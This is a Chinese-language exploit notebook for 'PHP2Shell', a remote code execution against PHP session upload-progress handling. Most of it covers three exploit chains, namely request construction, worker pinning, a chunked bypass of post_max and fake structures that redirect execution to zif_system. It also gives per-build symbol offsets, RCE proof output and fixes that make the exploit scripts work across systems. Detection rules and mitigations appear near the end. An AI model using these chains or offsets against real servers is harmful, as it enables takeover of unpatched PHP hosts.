# PHP2Shell 实测结论汇总

这个文件记录本轮在真实环境里跑出来的所有结论，每个结论都带实测数据。
比文档更有价值的是"什么条件下打不通、为什么"——踩过的坑都在这里。

---

## 1. 什么配置能打

| 目标形态 | display_errors | memory_limit | worker | 结果 |
|---|---|---|---|---|
| Apache mod_php 8.5.11 官方镜像 | On | 8M | 单 worker | ✅ RCE |
| Apache mod_php 8.5.11 官方镜像 | On | 8M | 150 worker | ✅ RCE（需 pinning） |
| Apache mod_php 8.4.26 官方镜像 | On | 8M | 单 worker | ✅ RCE |
| Apache mod_php 8.4.26 官方镜像 | **Off** | **128M** | **150 worker** | ✅ **RCE** |
| nginx + php-fpm 8.5.11 | On | 8M | 单/多 worker | ❌ 链结构不同 |
| Apache mod_php PHP 7.4.21 | On | 8M | 单 worker | ❌ 链结构不同 |

**核心结论：`display_errors=Off` 不影响可利用性，同样能打进 RCE。**

---

## 2. 三条完全不同的链

PHP2Shell 不是一个洞，是三条独立的链，适用于完全不同的部署形态：

### 链 A：mod_php + display_errors=On（经典链）

```
A 请求：1001 字段 + PHPSESSID=\x00 + progress + file + 12MB 大字段
        → max_input_vars 警告 → headers_sent=1
        → session init 里 send_cookie 返回 FAILURE（但 send_cookie 仍为 1）
        → OOM → PS(id) 悬空、PS(mod_data)=NULL

B 请求：PHPSESSID=SID + progress + 841 字段 + 79B forge
        → pre-RINIT cleanup 重新 init session
        → 用悬空 PS(id) 走 url_encode，读 4096 字节
        → Set-Cookie 泄漏 chunk base
```

实测（8.5.11 / 8.4.26）：
```
[+] chunk base = 0x727b2f200000
[+] libphp base = 0x727b30e6a000
PROOF: uid=33(www-data)
```

### 链 B：mod_php + display_errors=Off + 128M（pure 链）

```
0. worker pinning：占住 149 个半截 POST，让 A1/B1/A2/B2 落到同一个 child
1. chunked 绕过 post_max：不带 Content-Length → content_length=0 → 跳过检查
2. A1：860 个 depth-64 嵌套文件字段 + filler + 78×8000B + 20×4000B burner
       + 4000B progress → OOM 精确落在 END cleanup 的 php_url_encode
       → bailout 留下悬空 PS(id)/PS(mod_data)，send_cookie=1
3. B1：伪造 zend_string 头（len=0xC8000），Set-Cookie 读 800KB
       → chunk base + libphp base（pDestructor=zval_ptr_dtor 出现 1095 次）
4. A2：cheap-OOM → PS(http_session_vars) 悬空
5. B2：384B 引用值覆盖成 fake zend_array，pDestructor=zif_system
```

实测（8.4.26 官方镜像 / php.ini-production / 150 worker）：
```
pinned 150/150 workers (149 holders)
[try 1] B1: decoded=819208 zval_ptr_dtor=0x7c1a77183b60 -> libphp=0x7c1a76b25000
[try 1] A2 + B2: main=0x7c1a74e00000 zif_system=0x7c1a76f8a370
[4/4] RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 链 C：nginx + php-fpm（BG(unserialize) 链）

和我们测的链完全不同：利用 `BG(unserialize)` 跨请求 stale state，不是 `PS(id)`。

```
producer：session_start() 里 4MB 值 OOM（RINIT 之后）
          → php_execute_script 捕获 bailout，worker 存活
          → BG(unserialize) 留下悬空 data 指针
consumer：multipart 请求，rfc1867 在 RINIT 之前跑
          → php_session_initialize 复用 stale d
          → 16KB 缓冲回收成 fake var_hash → fake HashTable
          → pDestructor = zif_system
```

前提（比链 A 高得多）：
- 双 pool（consumer 8M + builder 64M）
- 应用要 `session_start()` 且解码在 RINIT 之后
- 应用能把 reference（`R:N`）写进 session
- 单 worker 或能钉住 worker

---

## 3. 踩过的坑（重点）

### 坑 1：指针过滤写死 `0x7f` 段 —— 遇到三次

**这是换环境打不通最常见的原因。**

```python
# 错的
if 0x7F0000000000 <= v < 0x800000000000:

# 对的
if 0x500000000000 <= v < 0x800000000000:
```

Linux x86-64 用户态 mmap 区的落点取决于 ASLR 和内核策略，实测见过的段：

| 机器 | ASLR 段 | 写死 0x7f 的后果 |
|---|---|---|
| 101.200.220.128（Debian 13） | 0x7f... | 正常 |
| 192.168.3.210（Ubuntu 26.04） | 0x76a9... / 0x7c1a... / 0x727b... | **泄漏成功但解析返回 0，看起来像"堆布局不对"** |

症状很有迷惑性：
- B 请求稳定返回 4096 / 819208 字节 cookie（**泄漏一直是成功的**）
- hexdump 里面明明有 `0x76a9108a70a0` 这种指针
- 但 `chunk_base_from_cookie` 返回 0，报 `no heap pointers in leak window`
- 于是误判成"换系统后堆布局变了，要重新标定"

**实际只需要改一行范围判断。**

涉及文件：
- `php8.5.11/exploit.py`、`php8.4.26/exploit.py`（两处：`chunk_base_from_cookie`、`libphp_base_from_cookie`）
- `scripts/pure_128M_exploit.py`（`parse_leak`）
- `scripts/decode_cookie.py`

### 坑 2：FPM 的 OOM 会杀死 worker

```
WARNING: [pool www] child 8 exited with code 70
NOTICE: [pool www] child 30 started
```

mod_php 的 worker 在 OOM 后**保留堆**（fast_shutdown），FPM 直接杀 worker 重建。
所以链 A 的 `PS(id)` 悬空在 FPM 上根本留不住——**不是参数问题，是链不适用**。

多 worker 更糟：A 和 B 落在不同 worker，连同一个堆都不成立。

### 坑 3：先给 A 塞大字段会在解析阶段先 OOM

官方镜像有 39 个扩展（自编译的最小构建只有几个），基线内存高得多。

| memory_limit | NB 边界 | OOM 落点 |
|---|---|---|
| 8M | ≤236 → 200，≥238 → 500 | `php_sapi_filter` ← `rfc1867_post_handler` |
| 12M | ≤360 → 200，≥380 → 500 | 同上 |

gdb 栈：
```
MM_SAFE_ERROR
#1 zend_mm_alloc_pages
#2 zend_mm_alloc_large
#3 php_sapi_filter          ← 解析阶段就 OOM 了
#4 rfc1867_post_handler
```

**要在官方镜像上做 display_errors=Off，不能堆大字段，要用嵌套文件字段 + burner 精确控制**
（链 B 的做法），而不是简单加大字段。

### 坑 4：容器名必须叫 `php2shell-target`

`docker/offsets.py` 按这个名字读 libphp 符号，名字不对会回退到内置偏移，
stage2 必挂。compose 里的 `container_name` 别改。

### 坑 5：`out/` 目录权限

proof 文件由容器内 www-data 创建，宿主用户删不掉，`rm out/p1` 会 Permission denied。
要么 `chmod -R 777 out`，要么用 `-c 'id>out/p1_$RANDOM'`。

### 坑 6：`--chunked` 不能默认开

链 A 依赖 `Content-Length`（parsing 走另一条路径）。自动 chunked 会让 A 丢
Content-Length，泄漏直接断。必须显式 `--chunked`，只在打 128M 目标时用。

---

## 4. 版本与偏移

| 版本 | zif_system | zval_ptr_dtor | 说明 |
|---|---|---|---|
| 8.5.11 官方镜像 | 0x5996e0 | 0x7b47a0 | 实测可用 |
| 8.4.26 官方镜像 | 0x465370 | 0x65eb60 | 实测可用 |
| 8.4.26 自编译最小 | 0x43a870 | 0x613c50 | 仓库内置 lab profile |

**偏移跟二进制走，不跟版本号走。** 同一版本不同构建（官方镜像 vs 发行版包 vs 自编译）
偏移不同，必须 `nm` 重新取。

---

## 5. 各版本可利用性

| 版本 | 状态 | 说明 |
|---|---|---|
| 8.5.0 – 8.5.11 | 可 RCE | 本轮实测链 A |
| 8.4.0 – 8.4.26 | 可 RCE | 链 A + 链 B 都实测 |
| 8.3.0 – 8.3.35 | 可 RCE | 同链，需重标偏移 |
| 8.2.0 – 8.2.34 | 可 RCE | 需 `session_cancel_decode`（8.2 起有） |
| 7.4.21 | 链不适用 | `reset_id` 无条件清零 `send_cookie`；`progress->sid` 前置检查 |
| 7.x / 8.0 / 8.1 | 仅 poison | 无 `session_cancel_decode`，只能做 session 文件植入 |

PHP 7.4 的关键差异（源码确认）：

```c
/* 7.4 的 reset_id：发送失败也清零 send_cookie */
if (PS(use_cookies) && PS(send_cookie)) {
    php_session_send_cookie();
    PS(send_cookie) = 0;      /* ← 无条件清零，链 A 的残留守卫不成立 */
}
```

而且 upload-progress 回调里有前置检查：

```c
/* FILE_START 之前 */
if (!Z_TYPE(progress->sid) || !progress->key.s) break;   /* 没 cookie 直接跳过 */
...
PS(send_cookie) = 0;                                      /* 有 cookie 也不发 */
```

---

## 6. 修复版本

PHP 在 2026-10-21 发布，修复引入 `php_basic_early_rinit()`，
在 `php_request_startup()` 里、请求体解析**之前** memsets `BG(unserialize)`：

| 分支 | 漏洞版本 | 修复版本 |
|---|---|---|
| 8.5 | 8.5.0 – 8.5.11 | **8.5.12** |
| 8.4 | 8.4.0 – 8.4.26 | **8.4.27** |
| 8.3 | 8.3.0 – 8.3.35 | **8.3.36** |
| 8.2 | 8.2.0 – 8.2.34 | **8.2.35** |
| ≤8.1 | 全部 | **永不修复** |

8.5.12 的修复要点：
- delayed_oom 状态机 + `UnwindExit`
- 可失败分配的 failable allocs
- `memory_hard_limit_percent`
- `zend_shutdown_executor_values` 里无条件 `ZVAL_UNDEF(&EG(last_fatal_error_backtrace))`
- `PS(in_rfc1867_update)` 恢复
- 重置 `EG(user_error_handler)` / `EG(errors)` / `EG(error_handling)`

---

## 7. 检测建议

### 流量特征

链 A / 链 B 都有的特征：

```
POST 含 PHP_SESSION_UPLOAD_PROGRESS 字段
+ 同时带 PHPSESSID（或 \x00）
+ 请求体 > memory_limit
+ 同一源 IP 短时间内大量半截 POST（worker pinning 特征）
+ 响应 Set-Cookie 里 PHPSESSID 长度远超 32 字符
```

**最有效的单条规则**：`Set-Cookie: PHPSESSID=` 的值长度 > 64 字节。
正常 session id 是 32 字符，泄漏链会返回 4096 / 819208 字节。

### 日志特征

```
PHP Request Startup: Session cookie cannot be sent after headers have already been sent
Allowed memory size of 8388608 bytes exhausted (tried to allocate 2098791 bytes)
zend_mm_heap corrupted
[core:notice] child pid N exit signal Abort (6)
```

`zend_mm_heap corrupted` + SIGABRT 且非崩在正常业务，基本就是被打。

### 缓解

- 升级到 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35
- 无法升级时：`session.upload_progress.enabled=Off`（直接断链）
- 或 `session.use_strict_mode=1` + `session.upload_progress.cleanup=On`
- 限流：单 IP 并发半截 POST 数、单请求 body 大小
- WAF 规则：`PHP_SESSION_UPLOAD_PROGRESS` + 超大 body 组合

**注意：`display_errors=Off` 不是缓解措施**，本轮已实测关闭后照样 RCE。

---

## 8. 致谢

- 原始漏洞报告：PHP 官方 advisory、PHP Foundation
- 链 A：9bie/php2shell-bypass-aslr-exp
- 链 B：imbutus/php2shell-bypass-aslr-exp（pure 链，无需 display_errors）
- 链 C（FPM）：VABISMO/php2shell-nginx-fpm-full-rce
- 本轮实测：本仓库记录的实验数据
